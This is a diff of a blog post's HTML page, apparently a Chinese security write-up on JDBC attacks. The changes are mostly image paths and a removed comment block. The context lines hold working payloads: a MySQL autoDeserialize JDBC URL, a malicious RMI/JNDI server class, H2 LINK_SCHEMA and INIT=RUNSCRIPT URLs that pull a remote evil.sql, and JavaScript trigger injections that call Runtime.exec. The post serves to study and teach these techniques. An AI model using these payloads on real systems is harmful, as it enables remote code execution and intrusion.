@@ -26,34 +26,34 @@
 <meta property="og:site_name" content="EddieMurphy&#39;s blog">
 <meta property="og:description" content="前言JDBC（Java DataBase Connectivity）是SUN公司发布的一个java程序与数据库之间通信的接口（规范），各大数据库厂商去实现JDBC规范，并将实现类打包成jar包。  由于JDK版本的提升以及依赖包的更新，各种恶意类方面的反序列化都或多或少收到影响，能打的链子也会越来越少，但是JDBC把数据库机制引入，使得在当前大环境下Java漏洞不仅仅局限在java方面，也可以配合">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/52834923.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/74856268.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/74917368.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/75009305.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/75118532.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/75141320.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/75959888.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/80049784.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/80102966.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/80357092.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/80414155.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/80443447.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/81204143.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/81216278.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/81226959.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/81240153.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/81326106.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/81406492.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/81531078.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/81544236.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/81602835.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/81626818.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/13/JDBC/image-20240813152834923.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/13/JDBC/image-20240813174856268.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/13/JDBC/image-20240813174917368.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/13/JDBC/image-20240813175009305.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/13/JDBC/image-20240813175118532.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/13/JDBC/image-20240813175141320.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/13/JDBC/image-20240813175959888.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/13/JDBC/image-20240813180049784.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/13/JDBC/image-20240813180102966.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/13/JDBC/image-20240813180357092.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/13/JDBC/image-20240813180414155.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/13/JDBC/image-20240813180443447.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/13/JDBC/image-20240813181204143.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/13/JDBC/image-20240813181216278.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/13/JDBC/image-20240813181226959.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/13/JDBC/image-20240813181240153.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/13/JDBC/image-20240813181326106.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/13/JDBC/image-20240813181406492.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/13/JDBC/image-20240813181531078.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/13/JDBC/image-20240813181544236.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/13/JDBC/image-20240813181602835.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/13/JDBC/image-20240813181626818.png">
 <meta property="article:published_time" content="2024-08-13T07:22:00.000Z">
 <meta property="article:modified_time" content="2024-08-13T10:19:47.977Z">
 <meta property="article:author" content="EddieMurphy">
 <meta property="article:tag" content="Java">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/52834923.png">
+<meta name="twitter:image" content="https://eddiemurphy89.github.io/2024/08/13/JDBC/image-20240813152834923.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -312,7 +312,7 @@
               <div class="markdown-body">
                 
                 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>JDBC（Java DataBase Connectivity）是SUN公司发布的一个java程序与数据库之间通信的接口（规范），各大数据库厂商去实现JDBC规范，并将实现类打包成jar包。</p>
-<p><img src="/2024/07/28/Commons-Collections/52834923.png" srcset="/img/loading.gif" lazyload alt="image-20240813152834923"></p>
+<p><img src="/2024/08/13/JDBC/image-20240813152834923.png" srcset="/img/loading.gif" lazyload alt="image-20240813152834923"></p>
 <p>由于JDK版本的提升以及依赖包的更新，各种恶意类方面的反序列化都或多或少收到影响，能打的链子也会越来越少，但是JDBC把数据库机制引入，使得在当前大环境下Java漏洞不仅仅局限在java方面，也可以配合数据库方面进行attack，这种方式仍旧经久不衰，足见JDBC攻击的适应性之强。</p>
 <p>所以Hessian我还是放到后面再说，这里先把JDBC浅浅引入一下。</p>
 <h2 id="MySQL-JDBC"><a href="#MySQL-JDBC" class="headerlink" title="MySQL-JDBC"></a>MySQL-JDBC</h2><h3 id="反序列化分析"><a href="#反序列化分析" class="headerlink" title="反序列化分析"></a>反序列化分析</h3><p>进行数据库连接时指定了数据库的URL及连接配置</p>
@@ -343,17 +343,17 @@
 <p>设置对应的查询拦截器（即我们指定的<code>ServerStatusDiffInterceptor</code>）</p>
 <p>执行查询语句会调用拦截器的<code>preProcess</code>和<code>postProcess</code></p>
 <p>判断拦截器是否为空，非空则调用<code>invokeQueryInterceptorsPre</code></p>
-<p><img src="/2024/07/28/Commons-Collections/74856268.png" srcset="/img/loading.gif" lazyload alt="image-20240813174856268"></p>
+<p><img src="/2024/08/13/JDBC/image-20240813174856268.png" srcset="/img/loading.gif" lazyload alt="image-20240813174856268"></p>
 <p><code>invokeQueryInterceptorsPre</code>调用了拦截器的<code>preProcess</code>：</p>
-<p><img src="/2024/07/28/Commons-Collections/74917368.png" srcset="/img/loading.gif" lazyload alt="image-20240813174917368"></p>
+<p><img src="/2024/08/13/JDBC/image-20240813174917368.png" srcset="/img/loading.gif" lazyload alt="image-20240813174917368"></p>
 <p>看到执行了<code>SHOW SESSION STATUS</code>，并将结果（<code>com.mysql.cj.jdbc.result.ResultSetImpl</code>）传入<code>ResultSetUtil#resultSetToMap</code>进行反序列化处理：</p>
-<p><img src="/2024/07/28/Commons-Collections/75009305.png" srcset="/img/loading.gif" lazyload alt="image-20240813175009305"></p>
+<p><img src="/2024/08/13/JDBC/image-20240813175009305.png" srcset="/img/loading.gif" lazyload alt="image-20240813175009305"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resultSetToMap</span><span class="hljs-params">(Map mappedValues, ResultSet rs)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-keyword">while</span> (rs.next()) &#123;<br>        mappedValues.put(rs.getObject(<span class="hljs-number">1</span>), rs.getObject(<span class="hljs-number">2</span>));<br>    &#125;<br>&#125;<br><span class="hljs-comment">// getObject(2)</span><br><span class="hljs-keyword">if</span> (field.isBinary() || field.isBlob()) &#123;<br>    <span class="hljs-type">byte</span>[] data = getBytes(columnIndex);<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p><code>getObject</code>判断MySQL类型为BLOB后，从MySQL服务端获取对应的字节码数据</p>
 <p>从MySQL服务端获取到字节码数据后，判断<code>autoDeserialize</code>是否为true（连接URL中设置了<code>autoDeserialize=true</code>）、字节码数据是否为序列化对象（前两个字节为<code>-84</code>和<code>-19</code>标识序列化对象）等，最后调用<code>readObject</code>触发反序列化漏洞</p>
-<p><img src="/2024/07/28/Commons-Collections/75118532.png" srcset="/img/loading.gif" lazyload alt="image-20240813175118532"></p>
-<p><img src="/2024/07/28/Commons-Collections/75141320.png" srcset="/img/loading.gif" lazyload alt="image-20240813175141320"></p>
+<p><img src="/2024/08/13/JDBC/image-20240813175118532.png" srcset="/img/loading.gif" lazyload alt="image-20240813175118532"></p>
+<p><img src="/2024/08/13/JDBC/image-20240813175141320.png" srcset="/img/loading.gif" lazyload alt="image-20240813175141320"></p>
 <h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p><code>ServerStatusDiffInterceptor</code>触发。</p>
 <h4 id="8-x"><a href="#8-x" class="headerlink" title="8.x&lt;&#x3D;8.0.20"></a>8.x&lt;&#x3D;8.0.20</h4><blockquote>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:mysql:<span class="hljs-comment">//x.x.x.x:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span><br></code></pre></td></tr></table></figure>
@@ -396,14 +396,14 @@
 <p>在<a target="_blank" rel="noopener" href="http://www.h2database.com/html/cheatSheet.html">官网</a>下载jar包，调用里面的<code>org.h2.tools.Server</code>类</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">java <span class="hljs-literal">-cp</span> .\h2<span class="hljs-literal">-2</span>.<span class="hljs-number">2.220</span>.jar org.h2.tools.Server <span class="hljs-literal">-help</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2024/07/28/Commons-Collections/75959888.png" srcset="/img/loading.gif" lazyload alt="image-20240813175959888"></p>
+<p><img src="/2024/08/13/JDBC/image-20240813175959888.png" srcset="/img/loading.gif" lazyload alt="image-20240813175959888"></p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">java <span class="hljs-literal">-cp</span> .\h2<span class="hljs-literal">-2</span>.<span class="hljs-number">2.220</span>.jar org.h2.tools.Server <span class="hljs-literal">-web</span> <span class="hljs-literal">-webAllowOthers</span><br></code></pre></td></tr></table></figure>
 
 <p>启动Web console，默认监听8082端口</p>
 <p>H2的Web console不仅可以连接H2数据库，也可以连接其他支持JDBC API的数据库</p>
-<p><img src="/2024/07/28/Commons-Collections/80049784.png" srcset="/img/loading.gif" lazyload alt="image-20240813180049784"></p>
+<p><img src="/2024/08/13/JDBC/image-20240813180049784.png" srcset="/img/loading.gif" lazyload alt="image-20240813180049784"></p>
 <p>H2数据库默认用户名为sa、密码为空：</p>
-<p><img src="/2024/07/28/Commons-Collections/80102966.png" srcset="/img/loading.gif" lazyload alt="image-20240813180102966"></p>
+<p><img src="/2024/08/13/JDBC/image-20240813180102966.png" srcset="/img/loading.gif" lazyload alt="image-20240813180102966"></p>
 <h4 id="SpringBoot整合"><a href="#SpringBoot整合" class="headerlink" title="SpringBoot整合"></a>SpringBoot整合</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.h2database<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>h2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>在<code>application.properties</code>中添加h2连接的配置</p>
@@ -414,12 +414,12 @@
 <h3 id="H2-JNDI"><a href="#H2-JNDI" class="headerlink" title="H2-JNDI"></a>H2-JNDI</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilRMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">8025</span>);<br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;touch /tmp/h2-jndi-success&#x27;]).start()\&quot;)&quot;</span>));<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>        r.bind(<span class="hljs-string">&quot;evil&quot;</span>,referenceWrapper);<br>        System.out.println(<span class="hljs-string">&quot;running&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>使用BeanFactory本地工厂类实现的JNDI，H2是支持的。</p>
-<p><img src="/2024/07/28/Commons-Collections/80357092.png" srcset="/img/loading.gif" lazyload alt="image-20240813180357092"></p>
+<p><img src="/2024/08/13/JDBC/image-20240813180357092.png" srcset="/img/loading.gif" lazyload alt="image-20240813180357092"></p>
 <p>高版本的H2只允许JNDI lookup的URL以java开头：</p>
-<p><img src="/2024/07/28/Commons-Collections/80414155.png" srcset="/img/loading.gif" lazyload alt="image-20240813180414155"></p>
+<p><img src="/2024/08/13/JDBC/image-20240813180414155.png" srcset="/img/loading.gif" lazyload alt="image-20240813180414155"></p>
 <p>而在H2的函数文档中能发现一处可能造成JNDI注入的：<code>LINK_SCHEMA</code></p>
 <p><a target="_blank" rel="noopener" href="http://www.h2database.com/html/functions.html#link_schema">http://www.h2database.com/html/functions.html#link_schema</a></p>
-<p><img src="/2024/07/28/Commons-Collections/80443447.png" srcset="/img/loading.gif" lazyload alt="image-20240813180443447"></p>
+<p><img src="/2024/08/13/JDBC/image-20240813180443447.png" srcset="/img/loading.gif" lazyload alt="image-20240813180443447"></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> LINK_SCHEMA(<span class="hljs-string">&#x27;EddieMurphy&#x27;</span>, <span class="hljs-string">&#x27;javax.naming.InitialContext&#x27;</span>, <span class="hljs-string">&#x27;rmi://127.0.0.1:8025/evil&#x27;</span>, <span class="hljs-string">&#x27;EddieMurphy&#x27;</span>, <span class="hljs-string">&#x27;EddieMurphy&#x27;</span>, <span class="hljs-string">&#x27;PUBLIC&#x27;</span>);<br></code></pre></td></tr></table></figure>
 
 <p>同样高版本对URL进行了限制，只允许java开头</p>
@@ -473,13 +473,13 @@
 </blockquote>
 <p>可以用<code>javax.script.ScriptEngineManager</code>来创建一个<code>org.h2.api.Trigger</code>实例</p>
 <p><code>org.h2.schema.TriggerObject#loadFromSource</code></p>
-<p><img src="/2024/07/28/Commons-Collections/81204143.png" srcset="/img/loading.gif" lazyload alt="image-20240813181204143"></p>
+<p><img src="/2024/08/13/JDBC/image-20240813181204143.png" srcset="/img/loading.gif" lazyload alt="image-20240813181204143"></p>
 <p>判断是否为js或ruby脚本</p>
-<p><img src="/2024/07/28/Commons-Collections/81216278.png" srcset="/img/loading.gif" lazyload alt="image-20240813181216278"></p>
+<p><img src="/2024/08/13/JDBC/image-20240813181216278.png" srcset="/img/loading.gif" lazyload alt="image-20240813181216278"></p>
 <p>简单判断是否以<code>//javascript</code>开头</p>
-<p><img src="/2024/07/28/Commons-Collections/81226959.png" srcset="/img/loading.gif" lazyload alt="image-20240813181226959"></p>
+<p><img src="/2024/08/13/JDBC/image-20240813181226959.png" srcset="/img/loading.gif" lazyload alt="image-20240813181226959"></p>
 <p>然后就是经典的<code>new ScriptEngineManager().getEngineByName(&quot;javascript&quot;)</code></p>
-<p><img src="/2024/07/28/Commons-Collections/81240153.png" srcset="/img/loading.gif" lazyload alt="image-20240813181240153"></p>
+<p><img src="/2024/08/13/JDBC/image-20240813181240153.png" srcset="/img/loading.gif" lazyload alt="image-20240813181240153"></p>
 <p>返回<code>CompiledScript</code>调用其<code>eval</code></p>
 <p>低版本H2(1.4.200之前)貌似不支持js脚本，没有<code>isJavascriptSource</code>这段代码。</p>
 <h4 id="出网利用——init-runscript"><a href="#出网利用——init-runscript" class="headerlink" title="出网利用——init+runscript"></a>出网利用——init+runscript</h4><p>上面这些操作的利用前提都是h2 console成功连接到数据库。</p>
@@ -493,7 +493,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:h2:mem:test;INIT=RUNSCRIPT FROM <span class="hljs-string">&#x27;http://127.0.0.1:8888/evil.sql&#x27;</span><br></code></pre></td></tr></table></figure>
 
 <p>这个方法能用在任何能配置JDBC URL且依赖了H2的地方</p>
-<p><img src="/2024/07/28/Commons-Collections/81326106.png" srcset="/img/loading.gif" lazyload alt="image-20240813181326106"></p>
+<p><img src="/2024/08/13/JDBC/image-20240813181326106.png" srcset="/img/loading.gif" lazyload alt="image-20240813181326106"></p>
 <p>然后就可以URL远程加载恶意类了。</p>
 <h4 id="不出网利用——init-groovy"><a href="#不出网利用——init-groovy" class="headerlink" title="不出网利用——init+groovy"></a>不出网利用——init+groovy</h4><p>JDBC连接时<code>INIT</code>只允许执行一条SQL命令，而我们的命令执行有两句，一句创建UDF，一句执行UDF</p>
 <p>除非有已知表，使用<code>CREATE TRIGGER</code>就只需一句。实际上可以利用H2的系统表，H2和MySQL一样也有<code>INFORMATION_SCHEMA</code></p>
@@ -503,7 +503,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:h2:mem:test;init=CREATE TRIGGER TRIG_JS AFTER INSERT ON INFORMATION_SCHEMA.TABLES AS <span class="hljs-string">&#x27;//javascript</span><br><span class="hljs-string">Java.type(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)&#x27;</span><br></code></pre></td></tr></table></figure>
 
 <p>需要注意的是，H2提取URL中的配置时是通过分割分号<code>;</code>来提取的，因此JS代码中不能有分号，否则会报错（可以加上反斜杠代表转义）</p>
-<p><img src="/2024/07/28/Commons-Collections/81406492.png" srcset="/img/loading.gif" lazyload alt="image-20240813181406492"></p>
+<p><img src="/2024/08/13/JDBC/image-20240813181406492.png" srcset="/img/loading.gif" lazyload alt="image-20240813181406492"></p>
 <p>若目标环境有<code>Groovy</code>依赖，可以使用元编程的技巧来命令执行，在编译<code>Groovy</code>语句而非执行时就执行攻击者的代码。</p>
 <p>添加<code>groovy-sql</code>依赖</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.codehaus.groovy<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>groovy-sql<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
@@ -514,18 +514,18 @@
 <p><code>INIT</code>参数可以直接在连接数据库时执行初始化的sql语句</p>
 <p>除了<code>INIT</code>参数，一些参数在连接数据库时会执行SET命令，存在SQL注入</p>
 <p>比如<code>TRACE_LEVEL_SYSTEM_OUT</code>、<code>TRACE_MAX_FILE_SIZE</code>……</p>
-<p><img src="/2024/07/28/Commons-Collections/81531078.png" srcset="/img/loading.gif" lazyload alt="image-20240813181531078"></p>
+<p><img src="/2024/08/13/JDBC/image-20240813181531078.png" srcset="/img/loading.gif" lazyload alt="image-20240813181531078"></p>
 <p><code>org.h2.engine.Engine#openSession</code>会对我们传入的参数进行<code>SET</code>语句拼接</p>
-<p><img src="/2024/07/28/Commons-Collections/81544236.png" srcset="/img/loading.gif" lazyload alt="image-20240813181544236"></p>
+<p><img src="/2024/08/13/JDBC/image-20240813181544236.png" srcset="/img/loading.gif" lazyload alt="image-20240813181544236"></p>
 <p>开始尝试堆叠注入</p>
 <h4 id="坑：semicolon分割之痛"><a href="#坑：semicolon分割之痛" class="headerlink" title="坑：semicolon分割之痛"></a>坑：semicolon分割之痛</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=<span class="hljs-number">3</span>;CREATE TRIGGER TRIG_JS BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$<span class="hljs-comment">//javascript</span><br>Java.type(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)$$--<br></code></pre></td></tr></table></figure>
 
 <p>这个payload并不能打通，还得看它是怎么提取setting参数的</p>
 <p><code>org.h2.engine.ConnectionInfo#readSettingsFromURL</code> 这个类用于存储连接信息</p>
-<p><img src="/2024/07/28/Commons-Collections/81602835.png" srcset="/img/loading.gif" lazyload alt="image-20240813181602835"></p>
+<p><img src="/2024/08/13/JDBC/image-20240813181602835.png" srcset="/img/loading.gif" lazyload alt="image-20240813181602835"></p>
 <p>问题就出在这，我们用于堆叠注入的分号<code>;</code>，同时也是H2用来提取设置参数的分隔符。。。🥲</p>
 <p>但要是settings的值本来就存在分号怎么办，照理是会提供转义的，跟进<code>StringUtils.arraySplit</code>一探究竟</p>
-<p><img src="/2024/07/28/Commons-Collections/81626818.png" srcset="/img/loading.gif" lazyload alt="image-20240813181626818"></p>
+<p><img src="/2024/08/13/JDBC/image-20240813181626818.png" srcset="/img/loading.gif" lazyload alt="image-20240813181626818"></p>
 <p>果然是支持反斜杠转义的。因此在payload中分号前面加上<code>\</code>即可</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=<span class="hljs-number">1</span>\;CREATE TRIGGER TRIG_JS BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$<span class="hljs-comment">//javascript</span><br>Java.type(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)$$--<br></code></pre></td></tr></table></figure>
 
@@ -640,24 +640,6 @@
   
     <article id="comments" lazyload>
       
-  <div class="disqus" style="width:100%">
-    <div id="disqus_thread"></div>
-    
-      <script>
-        Fluid.utils.loadComments('#disqus_thread', function() {
-          Fluid.utils.createCssLink('https://lib.baomitu.com/disqusjs/1.3.0/disqusjs.css');
-          Fluid.utils.createScript('https://lib.baomitu.com/disqusjs/1.3.0/disqus.js', function() {
-            new DisqusJS({
-              shortname: 'fluid',
-              apikey: 'YdcgVedHrqu2ioQd1eVoUrqG'
-            });
-          });
-        });
-      </script>
-    
-    <noscript>Please enable JavaScript to view the comments</noscript>
-  </div>
-
 
     </article>
   
